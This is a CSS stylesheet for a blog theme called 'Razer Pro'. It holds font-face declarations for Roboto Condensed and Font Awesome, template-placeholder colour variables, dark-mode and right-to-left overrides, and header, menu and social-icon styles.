@font-face{font-family:'Roboto Condensed';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVl2ZhZI2eCN5jzbjEETS9weq8-1967DRs5.woff2) format("woff2");unicode-range:U+1F00-1FFF}
@font-face{font-family:'Roboto Condensed';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVl2ZhZI2eCN5jzbjEETS9weq8-19G7DRs5.woff2) format("woff2");unicode-range:U+0370-03FF}
@font-face{font-family:'Roboto Condensed';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVl2ZhZI2eCN5jzbjEETS9weq8-1927DRs5.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+1EA0-1EF9,U+20AB}
@font-face{font-family:'Roboto Condensed';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVl2ZhZI2eCN5jzbjEETS9weq8-19y7DRs5.woff2) format("woff2");unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}
@font-face{font-family:'Roboto Condensed';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVl2ZhZI2eCN5jzbjEETS9weq8-19K7DQ.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}
@font-face{font-family:'Roboto Condensed';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVi2ZhZI2eCN5jzbjEETS9weq8-32meGCkYb8td.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}
@font-face{font-family:'Roboto Condensed';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVi2ZhZI2eCN5jzbjEETS9weq8-32meGCAYb8td.woff2) format("woff2");unicode-range:U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}
@font-face{font-family:'Roboto Condensed';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVi2ZhZI2eCN5jzbjEETS9weq8-32meGCgYb8td.woff2) format("woff2");unicode-range:U+1F00-1FFF}
@font-face{font-family:'Roboto Condensed';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVi2ZhZI2eCN5jzbjEETS9weq8-32meGCcYb8td.woff2) format("woff2");unicode-range:U+0370-03FF}
@font-face{font-family:'Roboto Condensed';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVi2ZhZI2eCN5jzbjEETS9weq8-32meGCsYb8td.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+1EA0-1EF9,U+20AB}
@font-face{font-family:'Roboto Condensed';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVi2ZhZI2eCN5jzbjEETS9weq8-32meGCoYb8td.woff2) format("woff2");unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}
@font-face{font-family:'Roboto Condensed';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/robotocondensed/v19/ieVi2ZhZI2eCN5jzbjEETS9weq8-32meGCQYbw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}

/*-- Font Awesome Free 5.15.1 --*/
@font-face{font-family:"Font Awesome 5 Brands";font-display:swap;font-style:normal;font-weight:400;font-display:block;src:url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/webfonts/fa-brands-400.eot);src:url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/webfonts/fa-brands-400.eot?#iefix) format("embedded-opentype"),url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/webfonts/fa-brands-400.woff2) format("woff2"),url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/webfonts/fa-brands-400.woff) format("woff"),url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/webfonts/fa-brands-400.ttf) format("truetype"),url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/webfonts/fa-brands-400.svg#fontawesome) format("svg")}.fab{font-family:"Font Awesome 5 Brands";font-weight:400}
@font-face{font-family:"Font Awesome 5 Free";font-display:swap;font-style:normal;font-weight:400;font-display:block;src:url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/webfonts/fa-regular-400.eot);src:url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/webfonts/fa-regular-400.eot?#iefix) format("embedded-opentype"),url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/webfonts/fa-regular-400.woff2) format("woff2"),url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/webfonts/fa-regular-400.woff) format("woff"),url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/webfonts/fa-regular-400.ttf) format("truetype"),url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/webfonts/fa-regular-400.svg#fontawesome) format("svg")}.far{font-family:"Font Awesome 5 Free";font-weight:400}
@font-face{font-family:"Font Awesome 5 Free";font-display:swap;font-style:normal;font-weight:900;font-display:block;src:url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/webfonts/fa-solid-900.eot);src:url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/webfonts/fa-solid-900.eot?#iefix) format("embedded-opentype"),url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/webfonts/fa-solid-900.woff2) format("woff2"),url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/webfonts/fa-solid-900.woff) format("woff"),url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/webfonts/fa-solid-900.ttf) format("truetype"),url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/webfonts/fa-solid-900.svg#fontawesome) format("svg")}.fa,.far,.fas{font-family:"Font Awesome 5 Free"}.fa,.fas{font-weight:900}

/*-- CSS Variables --*/
:root{
--body-font:'$(main.font.family)', Arial, sans-serif;
--menu-font:'$(menu.font.family)', Arial, sans-serif;
--title-font:'$(title.font.family)', Arial, sans-serif;
--meta-font:'$(main.font.family)', Arial, sans-serif;
--text-font:'$(text.font.family)', Arial, sans-serif;
--body-bg-color:$(background.color);
--body-bg:$(body.background);
--outer-bg:$(outer.bg);
--main-color:$(main.color);
--title-color:$(title.color);
--title-hover-color:$(title.hover.color);
--meta-color:$(meta.color);
--text-color:$(text.color);
--tag-bg:$(main.color)aa;
--topbar-bg:$(topbar.bg);
--topbar-color:$(topbar.color);
--topbar-hover-color:$(topbar.hover.color);
--header-bg:$(header.bg);
--header-color:$(header.color);
--header-hover-color:$(header.hover.color);
--submenu-bg:$(submenu.bg);
--submenu-color:$(submenu.color);
--submenu-hover-color:$(submenu.hover.color);
--megamenu-bg:$(megamenu.bg);
--megamenu-color:$(megamenu.color);
--megamenu-hover-color:$(megamenu.hover.color);
--mobilemenu-bg:$(mmenu.bg);
--mobilemenu-color:$(mmenu.color);
--mobilemenu-hover-color:$(mmenu.hover.color);
--widget-bg:$(widget.bg);
--widget-title-color:$(wtitle.color);
--feat-title-bg:$(feat.title.bg);
--feat-title-color:$(feat.title.color);
--feat-more-bg:$(feat.more.bg);
--feat-more-color:$(feat.more.color);
--post-title-color:$(post.title.color);
--post-title-hover-color:$(post.title.hover.color);
--post-text-color:$(post.text.color);
--footer-bg:$(footer.bg);
--footer-color:$(footer.color);
--footer-hover-color:$(footer.hover.color);
--footer-text-color:$(footer.text.color);
--footerbar-bg:$(footerbar.bg);
--footerbar-color:$(footerbar.color);
--footerbar-hover-color:$(footerbar.hover.color);
--cookie-bg:$(cookie.bg);
--cookie-color:$(cookie.color);
--button-bg:$(button.bg);
--button-lite-bg:$(button.bg)10;
--button-color:$(button.color);
--button-hover-bg:$(button.hover.bg);
--button-hover-color:$(button.hover.color);
--border-color:rgba(155,155,155,0.1);
--border-radius:3px;
--widget-shadow:0 1px 2px rgba(0,0,0,0.025);
--avatar-shadow:0px 1px 4px rgba(0,0,0,0.05);
}
html.is-dark{
--body-bg-color:#2b2b2b;
--body-bg:$(body.background);
--outer-bg:#181818;
--title-color:#f6f7f8;
--title-hover-color:$(main.color);
--meta-color:#aaaaaa;
--text-color:#b4b6ba;
--topbar-bg:#181818;
--topbar-color:#c2c2c3;
--topbar-hover-color:$(main.color);
--header-bg:#202020;
--header-color:#f6f7f8;
--header-hover-color:$(main.color);
--submenu-bg:#242424;
--submenu-color:#f6f7f8;
--submenu-hover-color:$(main.color);
--megamenu-bg:#242424;
--megamenu-color:#f6f7f8;
--megamenu-hover-color:$(main.color);
--mobilemenu-bg:#181818;
--mobilemenu-color:#f6f7f8;
--mobilemenu-hover-color:$(main.color);
--widget-bg:#202020;
--widget-title-color:#f6f7f8;
--feat-title-bg:#202020;
--post-title-color:#f6f7f8;
--feat-more-bg:#393939;
--feat-more-color:#f6f7f8;
--post-title-hover-color:$(main.color);
--post-text-color:b4b6ba;
--footer-bg:#202020;
--footer-color:#f6f7f8;
--footer-hover-color:$(main.color);
--footer-text-color:#b4b6ba;
--footerbar-bg:#181818;
--footerbar-color:#f6f7f8;
--footerbar-hover-color:$(main.color);
--cookie-bg:#242424;
--cookie-color:#b4b6ba;
--button-bg:$(main.color);
--button-color:#ffffff;
--button-hover-bg:$(button.hover.bg);
--button-hover-color:$(button.hover.color);
--border-color:rgba(155,155,155,0.05);
}
html.rtl{
--body-font:'Tajawal',Arial,sans-serif;
--title-font:'Tajawal',Arial,sans-serif;
--meta-font:'Tajawal',Arial,sans-serif;
--text-font:'Tajawal',Arial,sans-serif;
}

/*-- Reset CSS --*/
a,abbr,acronym,address,applet,b,big,blockquote,body,caption,center,cite,code,dd,del,dfn,div,dl,dt,em,fieldset,font,form,h1,h2,h3,h4,h5,h6,html,i,iframe,img,ins,kbd,label,legend,li,object,p,pre,q,s,samp,small,span,strike,strong,sub,sup,table,tbody,td,tfoot,th,thead,tr,tt,u,ul,var{padding:0;margin:0;border:0;outline:none;vertical-align:baseline;background:0 0;text-decoration:none}dl,ul{list-style-position:inside;list-style:none}ul li{list-style:none}caption{text-align:center}img{border:none;position:relative}a,a:visited{text-decoration:none}.clearfix{clear:both}.section,.widget,.widget ul{margin:0;padding:0}a{color:var(--main-color)}a img{border:0}abbr{text-decoration:none}.CSS_LIGHTBOX{z-index:999999!important}.CSS_LIGHTBOX_ATTRIBUTION_INDEX_CONTAINER .CSS_HCONT_CHILDREN_HOLDER > .CSS_LAYOUT_COMPONENT.CSS_HCONT_CHILD:first-child > .CSS_LAYOUT_COMPONENT{opacity:0}.separator a{text-decoration:none!important;clear:none!important;float:none!important;margin-left:0!important;margin-right:0!important}#Navbar1,#navbar-iframe,.widget-item-control,a.quickedit,.home-link,.feed-links{display:none!important}.center{display:table;margin:0 auto;position:relative}.widget > h2,.widget > h3{display:none}.widget iframe,.widget img{max-width:100%}button,input,select,textarea{font-family:var(--body-font);-webkit-appearance:none;-moz-appearance:none;appearance:none;outline:none;border-radius:0}

/*-- Style CSS --*/
*{box-sizing:border-box}
html{position:relative;word-break:break-word;word-wrap:break-word;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;-webkit-text-size-adjust:100%}
body{position:relative;background:var(--body-bg);background-color:var(--body-bg-color);font-family:var(--body-font);font-size:14px;color:var(--text-color);font-weight:400;font-style:normal;line-height:1.4em}
.rtl{direction:rtl}
h1,h2,h3,h4,h5,h6{font-family:var(--title-font);font-weight:700}
a,button,input{transition:all 0s ease}
#outer-wrapper{position:relative;overflow:hidden;width:100%;max-width:100%;background-color:var(--outer-bg);margin:0 auto;padding:0}
.is-boxed #outer-wrapper{width:$(row.width + 50px);max-width:100%;box-shadow:0 0 20px rgba(0,0,0,.1)}
.is-dark .is-boxed #outer-wrapper{box-shadow:0 0 20px rgba(0,0,0,.3)}
.container{position:relative}
.row-x1{width:$(row.width)}
.row-x2{width:100%}
.flex-center{display:flex;justify-content:center}
#content-wrapper{position:relative;float:left;width:100%;overflow:hidden;padding:25px 0;margin:0}
#content-wrapper>.container{display:flex;justify-content:space-between}
.is-left #content-wrapper>.container,.rtl .is-right #content-wrapper>.container{flex-direction:row-reverse}
.rtl .is-left #content-wrapper>.container{flex-direction:row}
.theiaStickySidebar:after,.theiaStickySidebar:before{content:'';display:table;clear:both}
#main-wrapper{position:relative;width:calc(100% - $(sidebar.width + 25px))}
.no-sidebar #main-wrapper{width:100%}
#sidebar-wrapper{position:relative;width:$(sidebar.width)}
.no-sidebar #sidebar-wrapper{display:none}
.btn{position:relative;border:0;border-radius:var(--border-radius)}
.author-avatar-wrap,.comments .avatar-image-container,.entry-image-wrap{display:block;position:relative;overflow:hidden;background-color:rgba(155,155,155,.05);z-index:5;color:transparent!important}
.author-avatar,.entry-thumb{display:block;position:relative;width:100%;height:100%;background-size:cover;background-position:center center;background-repeat:no-repeat;z-index:1;opacity:0;transition:opacity .35s ease,filter 0s ease}
.author-avatar{background-size:100%;background-position:0 0}
.author-avatar.lazy-ify,.entry-thumb.lazy-ify{opacity:1}
.card-style:hover .entry-image-wrap .entry-thumb,.entry-image-wrap:hover .entry-thumb{filter:brightness(1.03)}
.entry-image-wrap.is-video:after{position:absolute;content:'\f04b';top:50%;right:50%;background-color:rgba(0,0,0,.5);width:34px;height:34px;font-family:'Font Awesome 5 Free';font-size:11px;color:#fff;font-weight:900;display:flex;align-items:center;justify-content:center;z-index:5;transform:translate(50%,-50%);box-sizing:border-box;padding:0 0 0 1px;margin:0;border:2px solid #fff;border-radius:50%;opacity:.9;transition:opacity .17s ease}
.card-style:hover .entry-image-wrap.is-video:after,.entry-image-wrap.is-video:hover:after{opacity:1}
.card-style .entry-image-wrap.is-video:after{top:15px;right:15px;transform:translate(0)}
.rtl .card-style .entry-image-wrap.is-video:after{left:15px;right:unset}
.entry-category{display:block;font-size:13px;color:var(--main-color);font-weight:500;text-transform:uppercase;margin:0 0 5px}
.entry-title{display:block;color:var(--post-title-color);font-weight:700;line-height:1.3em}
.entry-title a{display:block;color:var(--post-title-color)}
.entry-title a:hover{color:var(--post-title-hover-color)}
.entry-meta{display:flex;font-family:var(--meta-font);font-size:12px;color:var(--meta-color);font-weight:400;margin:4px 0 0}
.entry-meta .mi{display:flex}
.entry-meta .mi,.entry-meta .sp{margin:0 4px 0 0}
.rtl .entry-meta .mi,.rtl .entry-meta .sp{margin:0 0 0 4px}
.entry-meta .author-name{color:var(--main-color);font-weight:500}
.excerpt{font-family:var(--text-font);line-height:1.5em}
.entry-excerpt{display:block;font-size:14px;color:#b5b5ba;margin:5px 0 0}
.before-mask:before{content:'';position:absolute;left:0;right:0;bottom:0;height:70%;background-image:linear-gradient(to bottom,rgba(0,0,0,0),rgba(0,0,0,.7));-webkit-backface-visibility:hidden;backface-visibility:hidden;z-index:2;opacity:1;margin:0;transition:opacity .25s ease}
.card-style{overflow:hidden}
.entry-info{position:absolute;left:0;bottom:0;width:100%;background:linear-gradient(to bottom,rgba(0,0,0,0) 10%,rgba(0,0,0,.5));overflow:hidden;z-index:10;display:flex;flex-direction:column;padding:15px}
.entry-info .entry-category{display:flex;width:-moz-fit-content;width:fit-content;height:18px;background-color:var(--tag-bg);font-size:11px;color:#fff;font-weight:400;align-items:center;padding:0 5px;margin:0 0 10px;border-radius:2px}
.entry-info .entry-title a{color:#fff;text-shadow:0 1px 2px rgba(0,0,0,.1)}
.entry-info .entry-meta{color:#c5c5c5;text-shadow:0 1px 2px rgba(0,0,0,.1)}
.entry-info .entry-meta .author-name{color:#e5e5e5}
.error-msg{display:flex;align-items:center;font-size:14px;color:var(--meta-color);padding:20px 0;font-weight:400}
.error-msg b{font-weight:600}
.loader{position:relative;width:100%;height:100%;overflow:hidden;display:flex;align-items:center;justify-content:center;margin:0}
.loader:after{content:'';display:block;width:30px;height:30px;box-sizing:border-box;margin:0;border:2px solid var(--border-color);border-left-color:var(--main-color);border-radius:100%;animation:spinner .65s infinite linear;transform-origin:center}
@-webkit-keyframes spinner{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}
@keyframes spinner{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}
.social a:before{display:inline-block;font-family:'Font Awesome 5 Brands';font-style:normal;font-weight:400}
.social .blogger a:before{content:'\f37d'}
.social .apple a:before{content:'\f179'}
.social .amazon a:before{content:'\f270'}
.social .microsoft a:before{content:'\f3ca'}
.social .facebook a:before{content:'\f09a'}
.social .facebook-f a:before{content:'\f39e'}
.social .twitter a:before{content:'\f099'}
.social .rss a:before{content:'\f09e';font-family:'Font Awesome 5 Free';font-weight:900}
.social .youtube a:before{content:'\f167'}
.social .skype a:before{content:'\f17e'}
.social .stumbleupon a:before{content:'\f1a4'}
.social .tumblr a:before{content:'\f173'}
.social .vk a:before{content:'\f189'}
.social .stack-overflow a:before{content:'\f16c'}
.social .github a:before{content:'\f09b'}
.social .linkedin a:before{content:'\f0e1'}
.social .dribbble a:before{content:'\f17d'}
.social .soundcloud a:before{content:'\f1be'}
.social .behance a:before{content:'\f1b4'}
.social .digg a:before{content:'\f1a6'}
.social .instagram a:before{content:'\f16d'}
.social .pinterest a:before{content:'\f0d2'}
.social .pinterest-p a:before{content:'\f231'}
.social .twitch a:before{content:'\f1e8'}
.social .delicious a:before{content:'\f1a5'}
.social .codepen a:before{content:'\f1cb'}
.social .flipboard a:before{content:'\f44d'}
.social .reddit a:before{content:'\f281'}
.social .whatsapp a:before{content:'\f232'}
.social .messenger a:before{content:'\f39f'}
.social .snapchat a:before{content:'\f2ac'}
.social .telegram a:before{content:'\f3fe'}
.social .steam a:before{content:'\f3f6'}
.social .discord a:before{content:'\f392'}
.social .quora a:before{content:'\f2c4'}
.social .tiktok a:before{content:'\e07b'}
.social .share a:before{content:'\f064';font-family:'Font Awesome 5 Free';font-weight:900}
.social .email a:before{content:'\f0e0';font-family:'Font Awesome 5 Free'}
.social .external-link a:before{content:'\f35d';font-family:'Font Awesome 5 Free';font-weight:900}
.social-bg .blogger a,.social-bg-hover .blogger a:hover{background-color:#ff5722}
.social-bg .apple a,.social-bg-hover .apple a:hover{background-color:#333}
.social-bg .amazon a,.social-bg-hover .amazon a:hover{background-color:#fe9800}
.social-bg .microsoft a,.social-bg-hover .microsoft a:hover{background-color:#0067b8}
.social-bg .facebook a,.social-bg .facebook-f a,.social-bg-hover .facebook a:hover,.social-bg-hover .facebook-f a:hover{background-color:#3b5999}
.social-bg .twitter a,.social-bg-hover .twitter a:hover{background-color:#00acee}
.social-bg .youtube a,.social-bg-hover .youtube a:hover{background-color:#f50000}
.social-bg .instagram a,.social-bg-hover .instagram a:hover{background:linear-gradient(15deg,#ffb13d,#dd277b,#4d5ed4)}
.social-bg .pinterest a,.social-bg .pinterest-p a,.social-bg-hover .pinterest a:hover,.social-bg-hover .pinterest-p a:hover{background-color:#ca2127}
.social-bg .dribbble a,.social-bg-hover .dribbble a:hover{background-color:#ea4c89}
.social-bg .linkedin a,.social-bg-hover .linkedin a:hover{background-color:#0077b5}
.social-bg .tumblr a,.social-bg-hover .tumblr a:hover{background-color:#365069}
.social-bg .twitch a,.social-bg-hover .twitch a:hover{background-color:#6441a5}
.social-bg .rss a,.social-bg-hover .rss a:hover{background-color:#ffc200}
.social-bg .skype a,.social-bg-hover .skype a:hover{background-color:#00aff0}
.social-bg .stumbleupon a,.social-bg-hover .stumbleupon a:hover{background-color:#eb4823}
.social-bg .vk a,.social-bg-hover .vk a:hover{background-color:#4a76a8}
.social-bg .stack-overflow a,.social-bg-hover .stack-overflow a:hover{background-color:#f48024}
.social-bg .github a,.social-bg-hover .github a:hover{background-color:#24292e}
.social-bg .soundcloud a,.social-bg-hover .soundcloud a:hover{background:linear-gradient(#ff7400,#ff3400)}
.social-bg .behance a,.social-bg-hover .behance a:hover{background-color:#191919}
.social-bg .digg a,.social-bg-hover .digg a:hover{background-color:#1b1a19}
.social-bg .delicious a,.social-bg-hover .delicious a:hover{background-color:#0076e8}
.social-bg .codepen a,.social-bg-hover .codepen a:hover{background-color:#000}
.social-bg .flipboard a,.social-bg-hover .flipboard a:hover{background-color:#f52828}
.social-bg .reddit a,.social-bg-hover .reddit a:hover{background-color:#ff4500}
.social-bg .whatsapp a,.social-bg-hover .whatsapp a:hover{background-color:#3fbb50}
.social-bg .messenger a,.social-bg-hover .messenger a:hover{background-color:#0084ff}
.social-bg .snapchat a,.social-bg-hover .snapchat a:hover{background-color:#ffe700}
.social-bg .telegram a,.social-bg-hover .telegram a:hover{background-color:#179cde}
.social-bg .steam a,.social-bg-hover .steam a:hover{background:linear-gradient(5deg,#0d89bc,#112c5b,#0d1c47)}
.social-bg .discord a,.social-bg-hover .discord a:hover{background-color:#7289da}
.social-bg .quora a,.social-bg-hover .quora a:hover{background-color:#b92b27}
.social-bg .tiktok a,.social-bg-hover .tiktok a:hover{background-color:#fe2c55}
.social-bg .share a,.social-bg-hover .share a:hover{background-color:var(--meta-color)}
.social-bg .email a,.social-bg-hover .email a:hover{background-color:#888}
.social-bg .external-link a,.social-bg-hover .external-link a:hover{background-color:var(--title-color)}
.social-color .blogger a,.social-color-hover .blogger a:hover{color:#ff5722}
.social-color .apple a,.social-color-hover .apple a:hover{color:#333}
.social-color .amazon a,.social-color-hover .amazon a:hover{color:#fe9800}
.social-color .microsoft a,.social-color-hover .microsoft a:hover{color:#0067b8}
.social-color .facebook a,.social-color .facebook-f a,.social-color-hover .facebook a:hover,.social-color-hover .facebook-f a:hover{color:#3b5999}
.social-color .twitter a,.social-color-hover .twitter a:hover{color:#00acee}
.social-color .youtube a,.social-color-hover .youtube a:hover{color:#f50000}
.social-color .instagram a,.social-color-hover .instagram a:hover{color:#dd277b}
.social-color .pinterest a,.social-color .pinterest-p a,.social-color-hover .pinterest a:hover,.social-color-hover .pinterest-p a:hover{color:#ca2127}
.social-color .dribbble a,.social-color-hover .dribbble a:hover{color:#ea4c89}
.social-color .linkedin a,.social-color-hover .linkedin a:hover{color:#0077b5}
.social-color .tumblr a,.social-color-hover .tumblr a:hover{color:#365069}
.social-color .twitch a,.social-color-hover .twitch a:hover{color:#6441a5}
.social-color .rss a,.social-color-hover .rss a:hover{color:#ffc200}
.social-color .skype a,.social-color-hover .skype a:hover{color:#00aff0}
.social-color .stumbleupon a,.social-color-hover .stumbleupon a:hover{color:#eb4823}
.social-color .vk a,.social-color-hover .vk a:hover{color:#4a76a8}
.social-color .stack-overflow a,.social-color-hover .stack-overflow a:hover{color:#f48024}
.social-color .github a,.social-color-hover .github a:hover{color:#24292e}
.social-color .soundcloud a,.social-color-hover .soundcloud a:hover{color:#ff7400}
.social-color .behance a,.social-color-hover .behance a:hover{color:#191919}
.social-color .digg a,.social-color-hover .digg a:hover{color:#1b1a19}
.social-color .delicious a,.social-color-hover .delicious a:hover{color:#0076e8}
.social-color .codepen a,.social-color-hover .codepen a:hover{color:#000}
.social-color .flipboard a,.social-color-hover .flipboard a:hover{color:#f52828}
.social-color .reddit a,.social-color-hover .reddit a:hover{color:#ff4500}
.social-color .whatsapp a,.social-color-hover .whatsapp a:hover{color:#3fbb50}
.social-color .messenger a,.social-color-hover .messenger a:hover{color:#0084ff}
.social-color .snapchat a,.social-color-hover .snapchat a:hover{color:#ffe700}
.social-color .telegram a,.social-color-hover .telegram a:hover{color:#179cde}
.social-color .steam a,.social-color-hover .steam a:hover{color:#112c5b}
.social-color .discord a,.social-color-hover .discord a:hover{color:#7289da}
.social-color .quora a,.social-color-hover .quora a:hover{color:#b92b27}
.social-color .tiktok a,.social-color-hover .tiktok a:hover{color:#fe2c55}
.social-color .share a,.social-color-hover .share a:hover{color:var(--meta-color)}
.social-color .email a,.social-color-hover .email a:hover{color:#888}
.social-color .external-link a,.social-color-hover .external-link a:hover{color:var(--title-color)}
#header-wrapper{position:relative;float:left;width:100%;z-index:50;margin:0}
.topbar-wrap{position:relative;float:left;width:100%;height:28px;background-color:var(--topbar-bg);z-index:1;padding:0;margin:0}
:not(.is-dark) .topbar-wrap.has-border{border-bottom:1px solid var(--border-color)}
.topbar-items{position:relative;float:left;width:100%;display:flex;flex-wrap:wrap;justify-content:space-between;margin:0}
.topbar-items .section{position:relative;height:28px;margin:0}
.topbar-items .topbar-ul{display:flex;flex-wrap:wrap}
.topbar-items .topbar-ul li{display:inline-block;margin:0 20px 0 0}
.rtl .topbar-items .topbar-ul li{margin:0 0 0 20px}
.topbar-items .topbar-ul li a{display:block;font-size:12px;color:var(--topbar-color);line-height:28px}
.topbar-items .topbar-ul li a:hover{color:var(--topbar-hover-color)}
.topbar-items .topbar-social .topbar-ul li{margin:0 0 0 16px}
.rtl .topbar-items .topbar-social .topbar-ul li{margin:0 16px 0 0}
.topbar-items .topbar-social .topbar-ul li a{font-size:13px}
.header-inner,.main-header{position:relative;float:left;width:100%;height:52px;background-color:var(--header-bg);margin:0}
.header-inner{background-color:rgba(0,0,0,0)}
.header-header{position:relative;float:left;width:100%;height:52px;background-color:var(--header-bg);margin:0;box-shadow:0 2px 7px 0 rgba(0,0,0,.1)}
.is-boxed .header-header{float:none;width:$(row.width + 50px);max-width:100%;margin:0 auto;padding:0}
.header-items{position:relative;float:left;width:100%;display:flex;flex-wrap:wrap;justify-content:space-between;margin:0}
.flex-left{position:static;display:flex;margin:0}
.flex-right{position:absolute;top:0;right:0;background-color:var(--header-bg);margin:0}
.rtl .flex-right{left:0;right:unset;margin:0}
.main-logo{position:relative;float:left;height:52px;overflow:hidden;padding:0 14px 0 0;margin:0}
.rtl .main-logo{padding:0 0 0 14px}
.main-logo .widget{position:relative;height:100%;display:flex;align-items:center;margin:0}
.main-logo .logo-img{display:flex;align-items:center;height:34px;overflow:hidden;margin:0}
.main-logo img{display:block;max-width:100%;max-height:100%;margin:0}
.is-dark .main-logo img{-webkit-filter:invert(1);filter:invert(1)}
.main-logo .blog-title{display:block;font-size:23px;color:var(--header-color);font-weight:700;margin:0}
.main-logo .blog-title a{color:var(--header-color)}
.main-logo .blog-title a:hover{color:var(--header-hover-color)}
.main-logo #h1-off{position:absolute;top:-9000px;left:-9000px;display:none;visibility:hidden}
#razer-pro-main-nav{position:static;height:52px;z-index:10}
#razer-pro-main-nav .widget,#razer-pro-main-nav .widget>.widget-title{display:none}
#razer-pro-main-nav .show-menu{display:block}
#razer-pro-main-nav ul#razer-pro-main-nav-menu{display:flex;flex-wrap:wrap}
#razer-pro-main-nav ul>li{position:relative;padding:0;margin:0}
#razer-pro-main-nav-menu>li>a{position:relative;display:block;height:52px;font-family:var(--menu-font);font-size:14px;color:var(--header-color);font-weight:700;text-transform:uppercase;line-height:52px;padding:0 14px;margin:0}
#razer-pro-main-nav-menu>li:hover>a{color:var(--header-hover-color)}
#razer-pro-main-nav ul>li>.ul,#razer-pro-main-nav ul>li>ul{position:absolute;left:0;top:52px;width:180px;background-color:var(--submenu-bg);z-index:99999;padding:5px 0;backface-visibility:hidden;visibility:hidden;opacity:0;box-shadow:0 1px 2px rgba(0,0,0,.1),0 5px 10px 0 rgba(0,0,0,.1)}
.rtl #razer-pro-main-nav ul>li>.ul,.rtl #razer-pro-main-nav ul>li>ul{left:auto;right:0}
#razer-pro-main-nav ul>li>ul>li>ul{position:absolute;top:-5px;left:100%;margin:0}
.rtl #razer-pro-main-nav ul>li>ul>li>ul{left:unset;right:100%}
#razer-pro-main-nav ul>li>ul>li{display:block;float:none;position:relative}
.rtl #razer-pro-main-nav ul>li>ul>li{float:none}
#razer-pro-main-nav ul>li>ul>li a{position:relative;display:block;font-size:14px;color:var(--submenu-color);font-weight:400;padding:8px 14px;margin:0}
#razer-pro-main-nav ul>li>ul>li:hover>a{color:var(--submenu-hover-color)}
#razer-pro-main-nav ul>li.has-sub>a:after{content:'\f078';float:right;font-family:'Font Awesome 5 Free';font-size:9px;font-weight:900;margin:-1px 0 0 4px}
.rtl #razer-pro-main-nav ul>li.has-sub>a:after{float:left;margin:-1px 4px 0 0}
#razer-pro-main-nav ul>li>ul>li.has-sub>a:after{content:'\f054';float:right;margin:0}
.rtl #razer-pro-main-nav ul>li>ul>li.has-sub>a:after{content:'\f053'}
#razer-pro-main-nav ul .ul,#razer-pro-main-nav ul ul{transition:visibility .1s ease,opacity .17s ease}
#razer-pro-main-nav ul>li:hover>.ul,#razer-pro-main-nav ul>li:hover>ul,#razer-pro-main-nav ul>li>ul>li:hover>ul{visibility:visible;opacity:1;margin:0}
#razer-pro-main-nav .mega-menu{position:static!important}
#razer-pro-main-nav .mega-menu>.ul{width:100%;overflow:hidden;background-color:var(--megamenu-bg);padding:20px}
.mega-menu .mega-items{display:grid;grid-template-columns:repeat(5,1fr);column-gap:20px}
